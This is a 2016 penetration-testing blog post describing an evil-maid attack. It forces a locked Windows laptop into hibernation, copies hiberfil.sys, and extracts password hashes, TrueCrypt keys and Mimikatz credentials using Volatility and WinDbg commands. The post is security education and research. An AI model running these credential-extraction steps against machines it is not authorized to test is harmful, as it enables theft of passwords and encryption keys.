---
layout: post
title: Evil-Maid attacks with Hibernation
date: '2016-12-19T09:30:00.000+01:00'
author: Ramon Pinuaga
tags:
- Hibernation
- Windows
- Mimikatz
- Volatility
modified_time: '2016-12-19T09:30:03.830+01:00'
thumbnail: https://3.bp.blogspot.com/-jO_yXte8QC4/WFazMMNKFjI/AAAAAAAAANc/jHn1dELvpAwBbxV_PH3ZAsUPaopZy0JhwCLcB/s72-c/1.png
blogger_id: tag:blogger.com,1999:blog-9163961975500012189.post-6758497855438189260
blogger_orig_url: http://www.en.pentester.es/2016/12/evil-maid-attacks-with-hibernation.html
---

<div style="text-align: justify;">I have shared the speech I gave in the last RootedCon Valencia, about an <a href="http://www.slideshare.net/rpinuaga/bad-hibernationrooted">Evil-Maid attack technique exploiting Windows hibernation files</a>.</div><div style="text-align: justify;"><br /></div><div style="text-align: justify;">This technique is not new (and I didn't discover it for the first time), but it isn't very well documented.</div><div style="text-align: justify;"><br /></div><div style="text-align: justify;">I have also written about this kind of attacks in <a href="http://www.areopago21.org/2016/09/ataques-evil-maid_21.html">Areopago21 blog</a> (in Spanish).</div><div style="text-align: justify;"><br /></div><div style="text-align: justify;">In this post I am going to focus on the hands-on part.</div><div style="text-align: justify;"><br /></div><div style="text-align: justify;">Summarizing: If we get physical access to a computer powered on (but locked) or in suspension. We can try to recover the critical volatile information (session identifiers, clear-text passwords, cryptographic keys, etc.) from the hibernation file.</div><div style="text-align: justify;"><br /></div><div style="text-align: justify;">In order to obtain the hibernation file, we need to extract it from the hard drive. We could boot the computer from an external device (forensic Linux distro, Hirens bootcd, etc.) or we could take out the hard drive from the computer. If the hard drive is encrypted, it gets more complicated.</div><div style="text-align: justify;"><br /></div><div style="text-align: justify;">This file is in the root of the drive: c:\hiberfyl.sys. Even for Windows, this file is hidden by default and it is locked, so we can’t read it.</div><div style="text-align: justify;"><br /></div><div style="text-align: justify;">The hibernation file is never deleted, only its headers are modified when it is used for rebooting. This way, if the computer has been hibernated at any time in the past, we will have this file. If not, we need to force an hibernation.</div><div style="text-align: justify;"><br /></div><div style="text-align: justify;">This is possible even if the computer is locked, if the user has activated the hibernation option:</div><br /><div class="separator" style="clear: both; text-align: center;"><a href="https://3.bp.blogspot.com/-jO_yXte8QC4/WFazMMNKFjI/AAAAAAAAANc/jHn1dELvpAwBbxV_PH3ZAsUPaopZy0JhwCLcB/s1600/1.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="321" src="https://3.bp.blogspot.com/-jO_yXte8QC4/WFazMMNKFjI/AAAAAAAAANc/jHn1dELvpAwBbxV_PH3ZAsUPaopZy0JhwCLcB/s400/1.png" width="400" /></a></div><br /><div style="text-align: justify;">Unfortunately, starting from Windows 7, the hibernation feature is disabled by default. Although some laptop manufactures enable it.</div><div style="text-align: justify;"><br /></div><div style="text-align: justify;">However, there is a way to force hibernation. If the battery reaches critical level, the computer is hibernated automatically. This is configured by default in all Windows version up to Windows 10.</div><br /><div class="separator" style="clear: both; text-align: center;"><a href="https://3.bp.blogspot.com/-sujw-Utrsm4/WFazMVJBa8I/AAAAAAAAANg/edVcMPf1jbgLKMM-FOMV9fz-0s1FvKeewCEw/s1600/2.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="400" src="https://3.bp.blogspot.com/-sujw-Utrsm4/WFazMVJBa8I/AAAAAAAAANg/edVcMPf1jbgLKMM-FOMV9fz-0s1FvKeewCEw/s400/2.png" width="361" /></a></div><br /><div style="text-align: justify;">Once we have the hibernation file, we can work with it:</div><div style="text-align: justify;"><br /></div><div style="text-align: justify;">The basic tool for the task is Volatility; with it we can do the following things:</div><div style="text-align: justify;">•&nbsp;Obtaining information about the hibernation file: vol.exe hibinfo -f hiberfil.sys </div><div style="text-align: justify;">•&nbsp;Convert it to raw format: vol.exe imagecopy -f hiberfil.sys -O hiberfil.bin</div><div style="text-align: justify;">•&nbsp;Convert it to DMP format (Windbg compatible): vol.exe raw2dmp -f hiberfil.sys -O hiberfil.dmp</div><div style="text-align: justify;">•&nbsp;Obtaining the browsing history: vol.exe iehistory -f hiberfil.sys</div><div style="text-align: justify;">•&nbsp;Obtaining local password hashes: vol.exe hashdump -f hiberfil.sys</div><div style="text-align: justify;">•&nbsp;Obtaining Truecrypt cryptographic keys: vol.exe truecryptpassphrase -f hiberfil.sys</div><div style="text-align: justify;"><br /></div><div style="text-align: justify;">Example of usage:</div><br /><div class="separator" style="clear: both; text-align: center;"><a href="https://2.bp.blogspot.com/-F5N4IhB8Lq4/WFazMRgGWOI/AAAAAAAAANk/k1nNUiAN2fQ6bodc58Tpyc50IHOM4MGtACEw/s1600/3.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="110" src="https://2.bp.blogspot.com/-F5N4IhB8Lq4/WFazMRgGWOI/AAAAAAAAANk/k1nNUiAN2fQ6bodc58Tpyc50IHOM4MGtACEw/s400/3.png" width="400" /></a></div><br /><div style="text-align: justify;">We also have multiple <a href="https://github.com/volatilityfoundation/community">community plugins</a> for other tasks: mimikatz, bitlocker, bitcoin, etc.</div><div style="text-align: justify;"><br /></div><div style="text-align: justify;">For the conversion we can also use the <a href="https://blog.comae.io/your-favorite-memory-toolkit-is-back-f97072d33d5c#.6ioe7f777">tools from Matt Suiche</a> (just released), previously known as MoonSols Windows Memory Toolkit. They work better than Volatility and they support Windows up to version 10.</div><div style="text-align: justify;"><br /></div><div style="text-align: justify;">Despite we have a Mimikatz plugin for Volatility, it is very limited so it’s better to work directly with Mimikatz. For that we have to:</div><div style="text-align: justify;">•&nbsp;Convert the hiberfil.sys file to a format compatible with Windbg (DMP):</div><div style="text-align: justify;">&nbsp; o&nbsp;vol.exe raw2dmp -f hiberfil.sys -O hiberfil.dmp –profile=Win7SP0x64</div><div style="text-align: justify;">•&nbsp;Load the DMP into Windbg:</div><div style="text-align: justify;">&nbsp; o&nbsp;.symfix =&gt; Configures the Microsoft symbol repositories.</div><div style="text-align: justify;">&nbsp; o&nbsp;.reload =&gt; Reloads the needed symbols. </div><div style="text-align: justify;">&nbsp; o&nbsp;.load wow64exts =&gt; Loads the module for debugging WOW64 processes.</div><div style="text-align: justify;">&nbsp; o&nbsp;!wow64exts.sw =&gt; Activates WOW64 extensions.</div><div style="text-align: justify;">•&nbsp;Load Mimikatz module in Windbg:</div><div style="text-align: justify;">&nbsp; o&nbsp;.load c:\Users\rpinuaga\Desktop\bad-hibernation\demo\mimilib64.dll =&gt; Loads the Mimikatz module.</div><div style="text-align: justify;">&nbsp; o&nbsp;!process 0 0 lsass.exe =&gt; Looks for the lsass process (Local Security Authority Subsystem Service).</div><div style="text-align: justify;">&nbsp; o&nbsp;.process /r /p fffffa800424e910 =&gt; Configures the context to the lsass process.</div><div style="text-align: justify;">&nbsp; o&nbsp;!mimikatz</div><div style="text-align: justify;"><br /></div><div style="text-align: justify;">And it’s done, here we have the results:</div><br /><div class="separator" style="clear: both; text-align: center;"><a href="https://1.bp.blogspot.com/-rM2k309S9tc/WFazMUJ3j1I/AAAAAAAAANo/kWfDuHGnLDsJfQMHgCoDtK_baivxpP11ACEw/s1600/4.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="367" src="https://1.bp.blogspot.com/-rM2k309S9tc/WFazMUJ3j1I/AAAAAAAAANo/kWfDuHGnLDsJfQMHgCoDtK_baivxpP11ACEw/s400/4.png" width="400" /></a></div><br /><div style="text-align: justify;">Note: Volatility only supports hibernation files from Windows up to version 7 (starting in Windows 8 the format changes a bit). The new tool from Matt Suiche in theory allows it, but last time I checked the file resulting from the conversion was not recognized by Volatility.</div>